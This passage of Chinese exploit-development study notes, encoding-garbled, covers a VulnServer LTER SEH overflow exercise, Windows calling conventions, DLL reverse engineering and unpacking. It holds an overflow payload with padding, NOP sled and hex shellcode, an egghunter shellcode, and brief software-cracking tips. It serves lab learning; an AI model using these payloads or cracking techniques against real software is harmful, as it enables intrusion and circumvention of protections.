AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; + &quot;af115062&quot; + &quot;90&quot; * 20 + &quot;dac0d97424f4bb749627f35d2bc9b132315d1783c504032985c5062d418be9cd92ec6028a32c1639949c5c6f1956309baa1a9dac1b90fb839c8938821ed06c641e1b616567468837300c3fa73558fc4c054c84b1de6fa56454366587b9422c9fde6fe614141bf9fc64e456c14817a6066ec8dd7e8c75e645eea1635d4821d3b968e6824a6643c0146b52052f97dfa8ff119b8edb7a7fae7a272ecf9c888f75d725db07ba231a95c1061ca5c936759442d90229819dedcb03e88555c651c8653d95f5e5b76602f5b2634eb12f1edf544f8de07c215e6b1acdc1f7ca487a9d12&quot;
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-10-16_15-31-58.jpg" /></p>
<h5 id="g">ç»ƒä¹ G</h5>
<p>VulServerä¸­çš„LTERå‘½ä»¤
<code>./</code>åè·Ÿå¤šä¸ªå­—ç¬¦è§¦å‘æº¢å‡ºï¼Œæº¢å‡ºåˆ°SEH</p>
<p><img alt="" src="../../images/Snipaste_2023-10-17_16-49-24.jpg" /></p>
<p><img alt="" src="../../images/Snipaste_2023-10-17_16-50-37.jpg" /></p>
<p>è®¡ç®—SEHå’ŒNSEHåç§»é‡ï¼Œä¸Šé¢æ˜¯SEHï¼Œä¸‹é¢æ˜¯NSEH</p>
<pre><code>â””â”€# msf-pattern_offset -q 6f45346f                                                      
[*] Exact match at offset 3553

â””â”€# msf-pattern_offset -q 45336f45                                                      
[*] Exact match at offset 3549

</code></pre>
<p>æµ‹è¯•è¦†ç›–SEH</p>
<p><img alt="" src="../../images/Snipaste_2023-10-17_16-55-01.jpg" /></p>
<p>æµ‹è¯•åå­—ç¬¦ï¼Œç»“æœä¸º<code>\x80</code>åˆ°<code>\xff</code>å­—ç¬¦éƒ½è¢«è½¬æ¢æˆäº†<code>\x01</code>åˆ°<code>\x7f</code>ä¹‹é—´çš„å­—ç¬¦ã€‚</p>
<p>ASCIIå­—ç¬¦èŒƒå›´æ˜¯<code>\x00</code>åˆ°<code>\x7f</code>ï¼ŒLTERå‘½ä»¤ä»…æ¥å—ASCIIå­—ç¬¦ï¼Œä¼šå¯¹ASCIIä»¥å¤–çš„å­—ç¬¦è¿›è¡Œè½¬æ¢</p>
<p><img alt="" src="../../images/Snipaste_2023-10-17_17-15-38.jpg" /></p>
<p>ç”¨monaæ‰¾åˆ°åˆé€‚çš„sehåˆ©ç”¨æŒ‡ä»¤ç»„åœ°å€ï¼Œä»…æœ‰ASCIIå­—ç¬¦çš„åœ°å€ <code>6250120b</code>
<img alt="" src="../../images/Snipaste_2023-10-17_17-19-54.jpg" /></p>
<p>è·Ÿè¸ªä¹‹åç¡®è®¤è¦†ç›–äº†SEH</p>
<p><img alt="" src="../../images/Snipaste_2023-10-17_17-30-55.jpg" /></p>
<p>ä¸‹ä¸€æ­¥æ˜¯è·³å‡ºSEHåŒºï¼ŒçŸ­è·³æŒ‡ä»¤<code>jmp</code>çš„16è¿›åˆ¶<code>\xeb</code>æ˜¯åå­—ç¬¦ï¼Œä½¿ç”¨æ¡ä»¶è·³è½¬</p>
<h3 id="_29">ä»£ç æ‰§è¡Œæµé‡å®šå‘æµæŒ‡ä»¤</h3>
<p>åœ¨èƒ½æ§åˆ¶å¯„å­˜å™¨å€¼çš„æƒ…å†µä¸‹å¯ä»¥ç»„åˆä½¿ç”¨</p>
<pre><code>jmp esp   //FFE4
call esp  //FFD4
pop eax; call eax
</code></pre>
<h3 id="egghunter">egghunter</h3>
<p>PWND</p>
<pre><code>egghunter=b&quot;&quot;
egghunter+=b&quot;\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53&quot;
egghunter+=b&quot;\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c&quot;
egghunter+=b&quot;\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7&quot;
egghunter+=b&quot;\xff\xe7&quot;
</code></pre>
<h3 id="_30">ç”¨æˆ·æ¨¡å—å’Œç³»ç»Ÿæ¨¡å—é‡å®šå‘æŒ‡ä»¤åœ°å€é—®é¢˜</h3>
<p>ç”¨æˆ·æ¨¡å—ä¸­æŒ‡ä»¤çš„åœ°å€åœ¨ä¸åŒç³»ç»Ÿä¸Šæ˜¯ä¸å˜çš„ï¼Œç³»ç»Ÿæ¨¡å—ä¸­æŒ‡ä»¤çš„åœ°å€åœ¨ä¸åŒç³»ç»Ÿä¸Šæ˜¯ä¸åŒçš„ã€‚
å¦‚æœä½¿ç”¨ç”¨æˆ·æ¨¡å—çš„é‡å®šå‘è¯­å¥çš„åœ°å€ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœä½¿ç”¨ç³»ç»Ÿæ¨¡å—ä¸Šçš„é‡å®šå‘è¯­å¥åœ°å€ï¼Œè¿™å°±ä¼šå¯¼è‡´æœ¬åœ°æµ‹è¯•æˆåŠŸçš„<code>EIP</code>åœ°å€åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸å¯ç”¨ã€‚</p>
<p><em>!!ç³»ç»Ÿæ¨¡å—ä¸­çš„æŒ‡ä»¤åœ°å€åœ¨ä¸åŒç³»ç»Ÿç‰ˆæœ¬æ˜¯ä¸åŒçš„ã€‚</em></p>
<h3 id="rop">ROP</h3>
<p>https://cwinfosec.org/Intro-ROP-DEP-Bypass/
https://fluidattacks.com/blog/vulnserver-trun-rop/
https://ctf101.org/binary-exploitation/return-oriented-programming/</p>
<h3 id="seh">SEHæº¢å‡ºæ”»å‡»</h3>
<p>https://learn.microsoft.com/zh-tw/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170
https://blog.30cm.tw/2015/05/windowsbuffer-overflowsehshellcode.html
https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow</p>
<p>SEHæ˜¯windowsä¸Šå¤„ç†å¼‚å¸¸çš„æœºåˆ¶ï¼Œå¼‚å¸¸ä¼šç”±SEHé“¾ä¸€å±‚å±‚è½¬å…¥ç³»ç»Ÿåº•å±‚ã€‚
åœ¨<code>TIB</code>ä¸­ï¼Œæœ‰ä¸€ä¸ª<code>ExceptionList</code>é“¾è¡¨ï¼Œé“¾è¡¨ä¸­æœ‰ä¸€ä¸ª<code>_EXCEPTION_REGISTRATION_RECORD</code>ç»“æ„ä½“ã€‚
å½“æ•°æ®æº¢å‡ºåˆ°<code>_EXCEPTION_REGISTRATION_RECORD</code>çš„æŒ‡é’ˆä¸Šæ—¶ï¼Œä¼šå¯¼è‡´SEHæº¢å‡ºæ”»å‡»</p>
<pre><code>typedef struct _EXCEPTION_REGISTRATION_RECORD {
     struct _EXCEPTION_REGISTRATION_RECORD *Prev; 
     PEXCEPTION_ROUTINE Handler; 
} EXCEPTION_REGISTRATION_RECORD;
</code></pre>
<h3 id="aslraddress-space-layout-randomization">ASLR(<em>Address Space Layout Randomization</em>)åœ°å€ç©ºé—´éšæœºåŒ–</h3>
<p>ASLRä½¿ç¨‹åºæ¯æ¬¡æ‰§è¡Œæ—¶ï¼Œå†…å­˜ä¸­çš„å †ã€æ ˆBBSç­‰æ•°æ®æ¯æ¬¡å­˜æ”¾åœ¨ä¸åŒçš„å†…å­˜åœ°å€ï¼Œä½¿å¾—æŸ¥æ‰¾åç§»éš¾åº¦å˜å¤§ã€‚</p>
<h3 id="_31">è°ƒç”¨çº¦å®š</h3>
<p>CPUåœ¨å¤„ç†å‡½æ•°ä¸­çš„å‚æ•°æ—¶çš„ä¸€ç§è°ƒç”¨çº¦å®šæ–¹æ³•ï¼Œä¸åŒçš„è°ƒç”¨çº¦å®šä½¿ç”¨çš„å¯„å­˜å™¨å’Œè§„åˆ™ä¸å°½ç›¸åŒ</p>
<h4 id="fastcall">Fastcall</h4>
<p>Fastcallæ˜¯x64 Windowsçš„è°ƒç”¨çº¦å®šï¼ŒWindowsä¸Šçš„fastcallé»˜è®¤ä½¿ç”¨4ä¸ªå¯„å­˜å™¨ã€‚</p>
<h5 id="fast-call">Fast callçš„å·¥ä½œæ¨¡å¼</h5>
<pre><code>- å‰4ä¸ªå‚æ•°åœ¨å¯„å­˜å™¨ä¸­ä¼ é€’
- éæµ®ç‚¹å€¼(æµ®ç‚¹æ•°æˆ–åŒç²¾åº¦æµ®ç‚¹æ•°)çš„å‚æ•°å°†é€šè¿‡RCXã€RDXã€R8å’ŒR9(æŒ‰æ­¤é¡ºåº)ä¼ é€’ã€‚éæµ®ç‚¹å€¼åŒ…æ‹¬æŒ‡é’ˆã€æ•´æ•°ã€å¸ƒå°”å€¼ã€å­—ç¬¦ç­‰
- æµ®ç‚¹å‚æ•°å°†é€šè¿‡XMM0ã€XMM1ã€XMM2å’ŒXMM3ä¼ é€’(æŒ‰æ­¤é¡ºåº)ï¼Œæµ®ç‚¹æ•°åŒ…æ‹¬æµ®ç‚¹æ•°å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°
- å¦‚æœä¼ é€’çš„å‚æ•°å¤ªå¤§ï¼Œæ— æ³•è£…å…¥å¯„å­˜å™¨ï¼Œåˆ™é€šè¿‡å¼•ç”¨ä¼ é€’
- å‚æ•°æ°¸è¿œä¸ä¼šåˆ†å¸ƒåœ¨å¤šä¸ªå¯„å­˜å™¨ä¸­ã€‚å…¶ä»–å‚æ•°éƒ½æ”¾åœ¨æ ˆä¸Šã€‚
- åŸºæŒ‡é’ˆ(base pointer, RBP)è¢«ä¿å­˜ï¼Œä»¥ä¾¿æ¢å¤ã€‚
- å¦‚æœå‡½æ•°çš„è¿”å›å€¼æ˜¯æ•´æ•°ã€boolã€charç­‰ï¼Œåˆ™é€šè¿‡RAXä¼ é€’ï¼Œå¦‚æœæ˜¯æµ®ç‚¹æ•°æˆ–doubleï¼Œåˆ™é€šè¿‡XMM0ä¼ é€’ã€‚
- æˆå‘˜å‡½æ•°(å±äºç±»/ç»“æ„ä½“çš„å‡½æ•°)æœ‰ä¸€ä¸ªè¡¨ç¤ºthisæŒ‡é’ˆçš„éšå¼ç¬¬ä¸€ä¸ªå‚æ•°ã€‚å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå®ƒå°†é€šè¿‡RCX.[1]ä¼ é€’
- è°ƒç”¨è€…è´Ÿè´£ä¸ºè¢«è°ƒç”¨è€…çš„å‚æ•°åˆ†é…ç©ºé—´ã€‚è°ƒç”¨è€…å¿…é¡»æ€»æ˜¯ä¸º4ä¸ªå‚æ•°åˆ†é…ç©ºé—´ï¼Œå³ä½¿æ²¡æœ‰ä¼ é€’å‚æ•°ã€‚
- å¯„å­˜å™¨RAXã€RCXã€RDXã€R8ã€R9ã€R10ã€R11è¢«è®¤ä¸ºæ˜¯æ˜“å¤±çš„ï¼Œåœ¨å‡½æ•°è°ƒç”¨æ—¶å¿…é¡»è¢«è®¤ä¸ºæ˜¯è¢«é”€æ¯çš„(é™¤éæœ‰å…¶ä»–å®‰å…¨è¯æ˜â€”â€”é€šè¿‡åˆ†æï¼Œå¦‚æ•´ä¸ªç¨‹åºä¼˜åŒ–)ã€‚
- å¯„å­˜å™¨RBXã€RBPã€RDIã€RSIã€RSPã€R12ã€R13ã€R14å’ŒR15è¢«è®¤ä¸ºæ˜¯éæ˜“å¤±çš„ï¼Œå¿…é¡»é€šè¿‡ä½¿ç”¨å®ƒä»¬çš„å‡½æ•°æ¥ä¿å­˜å’Œæ¢å¤
</code></pre>
<p>å‡½æ•°ä¸­å‚æ•°çš„ä¼ é€’é¡ºåºå¦‚ä¸‹</p>
<pre><code>MOV DWORD PTR SS:[RSP + 0x38], 0x8 ;åŒç†
MOV DWORD PTR SS:[RSP + 0x30], 0x7 ;åŒç†
MOV DWORD PTR SS:[RSP + 0x28], 0x6 ;ç¬¬å…­ä¸ªå‚æ•°ä¼ ç»™DWORDæŒ‡é’ˆï¼Œç”±äºæ˜¯åŒå­—ï¼Œæ‰€ä»¥RSPåœ°å€æ˜¯RSP+0X28
MOV DWORD PTR SS:[RSP + 0x20], 0x5 ;ç¬¬äº”ä¸ªå‚æ•°ä¼ ç»™DWORDæŒ‡é’ˆï¼Œåœ°å€æ˜¯RSP+0X20
MOV R9D, 0x4  ;ç¬¬å››ä¸ªå‚æ•°ç»™R9D
MOV R8D, 0x3  ;ç¬¬ä¸‰ä¸ªå‚æ•°ç»™R8D
MOV EDX, 0x2  ;ç¬¬äºŒä¸ªå‚æ•°ç»™EDX
MOV ECX, 0x1  ;ç¬¬ä¸€ä¸ªå‚æ•°ç»™ECX
CALL function
</code></pre>
<h4 id="cdecl">cdecl</h4>
<p>cdeclæ˜¯Cè¯­è¨€è°ƒç”¨çº¦å®š</p>
<p>windows x86æ˜¯ç”¨cdeclè°ƒç”¨çº¦å®š</p>
<pre><code>- å‚æ•°åœ¨æ ˆä¸Šå‘åä¼ é€’(ä»å³åˆ°å·¦),ä¾ç…§æ ˆå…ˆå…¥åå‡ºçš„è§„çŸ©ï¼Œå…ˆä¼ é€’æœ€åçš„å‚æ•°ï¼Œå¥½è®©å‰é¢çš„å‚æ•°å…ˆå‡ºæ¥ã€‚ä¸ä½¿ç”¨å¯„å­˜å™¨
- åŸºæŒ‡é’ˆ(base pointer, RBP)è¢«ä¿å­˜ï¼Œä»¥ä¾¿æ¢å¤ã€‚
- è¿”å›å€¼é€šè¿‡EAXä¼ é€’ï¼Œå¦‚æœæ˜¯è¿”å›å€¼æ˜¯å­—èŠ‚æˆ–å­—ç¬¦éƒ¨åˆ†ï¼Œåˆ™ä½¿ç”¨EAXæ›´ä½ä½è¿”å›
- è°ƒç”¨è€…æ¸…é™¤å †æ ˆã€‚è¿™å°±æ˜¯cdeclçš„ç‰¹åˆ«ä¹‹å¤„ã€‚å› ä¸ºè°ƒç”¨è€…ä¼šæ¸…é™¤å †æ ˆï¼Œæ‰€ä»¥cdeclå…è®¸å¯å˜æ•°é‡çš„å‚æ•°ã€‚
- 32ä½çš„x86ï¼Œåœ¨æ ˆä¸Šä¼ å‚
- linuxä¸Š64ä½çš„x86ï¼ŒRDIã€RSIã€RDXã€RCXã€R8å’ŒR9ä¸­æŒ‰é¡ºåºæ”¾ç½®æœ€å¤š6ä¸ªå‚æ•°ï¼Œå…¶ä½™å‚æ•°åœ¨æ ˆä¸Š
- 

</code></pre>
<h4 id="stdcall">stdcall</h4>
<p>Standard Callingæ ‡å‡†è°ƒç”¨çº¦å®šï¼Œåœ¨32ä½çš„dllæ–‡ä»¶ä¸­ä½¿ç”¨çš„æ˜¯è¿™ç§</p>
<pre><code>- å‚æ•°ä»å³åˆ°å·¦åœ¨æ ˆä¸Šä¼ é€’ï¼Œä¸é€‚ç”¨å¯„å­˜å™¨
- è¢«è°ƒç”¨å‡½æ•°æ¸…é™¤æ ˆï¼Œåªèƒ½å…è®¸å›ºå®šæ•°é‡å‚æ•°çš„å‡½æ•°

</code></pre>
<h3 id="exe">ç®€å•exeåˆ†æ</h3>
<h4 id="printf">Printfå‡½æ•°</h4>
<p>é€šè¿‡å­—ç¬¦ä¸²å®šä½åˆ°å‡½æ•°ä½ç½®ï¼Œæœ¬ä¾‹ä¸­çŸ¥é“Hello Wordå­—ç¬¦ä¸²å°±æ˜¯mainå‡½æ•°ä¸­çš„
<img alt="" src="../../images/20230919111712.png" /></p>
<p>é€šè¿‡xAnalyzeræ’ä»¶å¯ä»¥åˆ†æå‡ºå‡½æ•°ä½ç½®ï¼Œå¸¦<code>$</code>å¹¶ä¸‹é¢æœ‰æ®µæ‹¬å·çš„å±äºå‡½æ•°æ®µ
<img alt="" src="../../images/20230919112420.png" /></p>
<pre><code>SUB RSP,0x28     //RSPå‡äº†ä¸€ä¸ªå€¼ã€‚å±äºå‡½æ•°åºè¨€
LEA RCX,QWORD PTR DS:[0x7FF6FA32E430]  //å°†0x7FF6FA32E430åœ°å€æŒ‡åˆ°RCXï¼Œåœ¨Fastcallä¸­ï¼ŒRCXæ˜¯ç”¨äºç»™å‡½æ•°ä¼ å‚çš„ç¬¬ä¸€ä¸ªå€¼ã€‚åœ¨è¿™é‡Œæ˜¯å°†Hello Wordä¼ ç»™äº†printf

CALL &lt;consoleapplication2.sub_7FF6FA311010&gt; //è°ƒç”¨å‡½æ•°ï¼Œè¿™é‡Œæ˜¯printfå‡½æ•°
XOR EAX,EAX   //å¼‚æˆ–EAXï¼Œå¼‚æˆ–è‡ªèº«ç»“æœä¸º0
ADD RSP,0x28  //è¿˜åŸæ ˆ
RET  //è¿”å›è°ƒç”¨,mainå‡½æ•°ç»“æœ
</code></pre>
<h4 id="_32">å¾ªç¯</h4>
<p><img alt="" src="../../images/20230919132548.png" /></p>
<pre><code>EBX/RBXæ˜¯å¾ªç¯çš„ç‰¹å¾
å¦‚å›¾æ‰€ç¤º
- å¾ªç¯ä»0å¼€å§‹ï¼ŒEBXè¢«å¼‚æˆ–æˆ0
- EBXä¸ºå¾ªç¯ç´¢å¼•ï¼Œä¸”ä¼ ç»™äº†EDXï¼Œä¸ºå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°
- ä¸€ä¸ªå­—ç¬¦ä¸²çš„åœ°å€æŒ‡åˆ°äº†RCXï¼Œä¸ºå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°
- è°ƒç”¨äº†printfå‡½æ•°
- EBXé€’å¢1
- CMPæ¯”è¾ƒ0xA(10)å’ŒEBX(æ­¤æ—¶ä¸º1)ï¼ŒEBX = EBX - 0xA
- JLæ ¹æ®Sæ ‡å¿—ä½è·³è½¬ï¼Œç”±äºä¸Šä¸€æ­¥ç»“æœæ˜¯1-10ä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥SFä¸º1ï¼Œåˆ™è·³è½¬
</code></pre>
<h3 id="dll">ç®€å•DLLåˆ†æ</h3>
<p>è¿™æ˜¯æ­¤dllä¸­çš„å¯¼å…¥å‡½æ•°
<img alt="" src="../../images/20230919182824.png" /></p>
<h4 id="_33">ä¿®é¥°å‡½æ•°</h4>
<p><img alt="" src="../../images/20230919172645.png" />
dllçš„å¯¼å‡ºå‡½æ•°ä¸­ï¼Œå¸¦æœ‰<code>@</code>ã€<code>?</code>çš„éƒ½æ˜¯ä¿®é¥°å‡½æ•°ï¼Œå¦‚æœä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¢«ä¿®é¥°ï¼Œé‚£ä»–æ˜¯Cå‡½æ•°æˆ–è€…ä½¿ç”¨<code>extern "C"</code>ç”³æ˜äº†æ˜¯Cå‡½æ•°ã€‚
ä¿®é¥°å‡½æ•°çš„å¥½å¤„æ˜¯å¯ä»¥çœ‹åˆ°è¿”å›ç±»å‹å’Œå‚æ•°</p>
<h4 id="sayhello">è°ƒç”¨SayHello</h4>
<p>å¯¹åº”åŠ è½½çš„exe</p>
<pre><code class="language-c++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

typedef void(WINAPI* aa)(void); //å®šä¹‰ä¸€ä¸ªå‡½æ•°ç±»å‹ä»¥ä¾›ä½¿ç”¨

int main()
{
    HMODULE dll = LoadLibraryA(&quot;DLL.DLL&quot;); //è½½å…¥dll

    if (dll != NULL)
    {
        aa aa1 = (aa)GetProcAddress(dll, &quot;SayHello&quot;); //ä»dllå¥æŸ„åŠ è½½SayHelloå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¼ ç»™è‡ªå®šä¹‰å‡½æ•°aa1
        if (aa1 != NULL) {
            aa1();  //è°ƒç”¨aa1ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨dllä¸­çš„SayHello
        }
        else {
            printf(&quot;Can't load the function.&quot;);
        }
    }
}
</code></pre>
<h4 id="printarray">PrintArray</h4>
<p><img alt="" src="../../images/20230920105351.png" /></p>
<pre><code>test edx,edx   ;edxä¸è‡ªèº«è¿›è¡ŒANDæ¯”è¾ƒ
jle dll.7FF960511F18   ;jleæŸ¥çœ‹æ ‡å¿—ä½ï¼ŒZFä¸º1ä¹Ÿå°±æ˜¯edxæ˜¯0çš„æƒ…å†µä¸‹è·³è½¬åˆ°retï¼Œç»“æŸå‡½æ•°
</code></pre>
<pre><code>mov qword ptr ss:[rsp+0x10],rsi    ;RSIèµ‹ç»™rsp+0x10åœ°å€
push rdi    ;å…¥æ ˆ
</code></pre>
<pre><code>sub rsp,0x20  ;å‡½æ•°åºè¨€
</code></pre>
<pre><code>mov qword ptr ss:[rsp+0x30],rbx   ;RBXè¢«å­˜åˆ°RSP+0x30ä½ç½®
mov rsi,rcx  ;ç¬¬ä¸€ä¸ªå‡½æ•°å‚æ•°RCXä¼ é€’ç»™RSI
xor ebx,ebx  ;EBXç½®0
</code></pre>
<pre><code>movsxd rdi,edx   ;ç¬¬äºŒä¸ªå‚æ•°EDXä¼ é€’ç»™RDI
mov edx,dword ptr ds:[rsi+rbx*4]     ;rsi+rbx*4åœ°å€ä¼ ç»™edx
</code></pre>
<pre><code>call &lt;dll.sub_7FF9605120B0&gt;   ;è°ƒç”¨å‡½æ•°ï¼Œè¿™æ˜¯std::cout
call &lt;dll.sub_7FF960514DD0&gt;   ;è°ƒç”¨å‡½æ•°ï¼Œè¿™æ˜¯std::end
</code></pre>
<pre><code>inc rbx    ;rbxè‡ªåŠ 1
cmp rbx,rdi  ;æ¯”è¾ƒrbxå’Œrdiï¼Œrdiçš„å€¼æ˜¯ç¬¬äºŒä¸ªå‚æ•°çš„å€¼
jl dll.7FF960511EA0   ;rbxå°äºç¬¬äºŒä¸ªå‚æ•°åˆ™è·³è½¬
</code></pre>
<h4 id="initializeplayer">InitializePlayer</h4>
<p><img alt="" src="../../images/20230920131138.png" /></p>
<pre><code>mov dword ptr ds:[rcx],0x20  ;0x20ç§»åŠ¨åˆ°rcxï¼Œrcxæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°
lea rdx,qword ptr ds:[0x7FF960549718]  ;è¿™æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œåœ°å€èµ‹ç»™äº†rdxï¼Œç¬¬äºŒä¸ªå‚æ•°


</code></pre>
<h3 id="_34">ç ´è§£è½¯ä»¶çš„è¦ç‚¹</h3>
<pre><code>- ç®€å•åŠ å¯†çš„è½¯ä»¶é€šå¸¸å¯ä»¥åœ¨æ‰¾åˆ°å…³é”®å‡½æ•°åï¼Œé‡‡ç”¨JMPç ´è§£
- é‡‡ç”¨è”ç½‘è®¤è¯çš„è½¯ä»¶ï¼Œéœ€è¦æ‰¾åˆ°ä¿æŠ¤å‡½æ•°
</code></pre>
<p><img alt="" src="../../images/20230922144557.png" /></p>
<h3 id="_35">è„±å£³</h3>
<p>åŠ å£³çš„ç‰¹ç‚¹
- è¾ƒé«˜çš„ç†µï¼ˆå¤§äºç­‰äº7ï¼‰
- è¾ƒå°‘çš„å¯¼å…¥å‡½æ•°
- ç‰¹å®šæ‰“åŒ…å™¨çš„æ ‡è¯†</p>
<p>æ ¹æ®å†…å­˜åˆ†é…è°ƒç”¨å’Œå†…å­˜å±æ€§æ›´æ”¹è°ƒç”¨æ‰‹åŠ¨æ‰¾åˆ°æ‰“åŒ…åçš„ä»£ç æˆ–æå–shellcode</p>
<h2 id="_36">æ¦‚å¿µ&amp;æœ¯è¯­</h2>
<h3 id="uipi-user-interface-privilege-isolation">UIPI   (User Interface Privilege Isolation)</h3>
<p>å…¨ç§°ç”¨æˆ·ç•Œé¢æƒé™éš”ç¦»ï¼Œåœ¨Windows 2008åå¼•å…¥ï¼Œç¦æ­¢ä½æƒé™è¿›ç¨‹åˆ©ç”¨æ¶ˆæ¯æœºåˆ¶å¯¹é«˜æƒé™è¿›ç¨‹è¿›è¡Œä»»æ„æ“ä½œã€‚
è¯¥è®¾ç½®é»˜è®¤å¼€å¯ï¼Œä½äºæ³¨å†Œè¡¨
<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</code> 
EnableUIPIé¡¹ä¸º0è¡¨ç¤ºç¦ç”¨åŠŸèƒ½</p>
<h3 id="sspi-security-support-provider-interface">SSPI  (Security Support Provider Interface)</h3>
<p>å®‰å…¨æ”¯æŒæä¾›ç¨‹åºæ¥å£ï¼Œå¯å¸®åŠ©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹å’Œç»´æŠ¤å®‰å…¨é€šé“ï¼Œæä¾›æœºå¯†æ€§ã€å®Œæ•´æ€§å’Œèº«ä»½éªŒè¯ã€‚
<img alt="" src="../../images/20230915170849.png" /></p>
<h3 id="bit-bytes">Bit &amp; Bytes</h3>
<pre><code>Bitï¼š0 or 1
Nibble: 4 bits
Byte: 8 bits
Word: 2 bytes, 16 bits
DWORD: 4 bytes, 32 bits
QWORD: 8 bytes, 64 bits
</code></pre>
<h3 id="_37">äºŒè¿›åˆ¶è¿ç®—</h3>
<pre><code>NOT  é
AND  ä¸”
OR   æˆ–
XOR  å¼‚æˆ–ï¼Œç›¸åŒä¸º0ï¼Œä¸åŒä¸º1
</code></pre>
<h2 id="_38">è¿è¡Œåº“&amp;å‡½æ•°</h2>
<h3 id="_set_app_type">_set_app_type</h3>
<pre><code>åœ¨å¯åŠ¨æ—¶ä½¿ç”¨çš„å†…éƒ¨å‡½æ•°å‘ŠçŸ¥ CRTï¼Œåº”ç”¨å±äºæ§åˆ¶å°åº”ç”¨ç¨‹åºè¿˜æ˜¯ GUI åº”ç”¨ã€‚
</code></pre>
<h3 id="controlfp">controlfp</h3>
<pre><code>ç”¨æ¥è®¾ç½®æˆ–è€…æŸ¥è¯¢æµ®ç‚¹ç¯å¢ƒçš„æ§åˆ¶ä½ï¼Œä¾‹å¦‚èˆå…¥æ¨¡å¼ã€å¼‚å¸¸å¤„ç†æ–¹å¼ç­‰
</code></pre>
<h3 id="_iob_func">_iob_func</h3>
<pre><code>æ ‡å‡†è¾“å…¥/è¾“å‡ºæµç›¸å…³
</code></pre>
<h3 id="_interlockedcompareexchange64">_InterlockedCompareExchange64</h3>
<p>å¯¹æ•°æ®è¿›è¡ŒåŸå­æ¯”è¾ƒçš„å‡½æ•°ï¼Œç¡®ä¿æ•°æ®ä¸ä¼šè¢«æ”¹å˜</p>
<p><code>LONG64 _InterlockedCompareExchange64(LONG64 volatile* Destination, LONG64 Exchange, LONG64 Comparand);</code></p>
<p>å½“ç¬¬ä¸€ä¸ªå‚æ•°Destinationç­‰äºç¬¬ä¸‰ä¸ªå‚æ•°Comparandæ—¶ï¼Œå°†ç¬¬ä¸€ä¸ªå‚æ•°æ›¿æ¢ä¸ºç¬¬äºŒä¸ªå‚æ•°Exchangeã€‚</p>
<p>ç¡®ä¿Destinationçš„å€¼å’ŒExchangeç›¸ç­‰</p>
<h3 id="rtlgetversion">RtlGetVersion</h3>
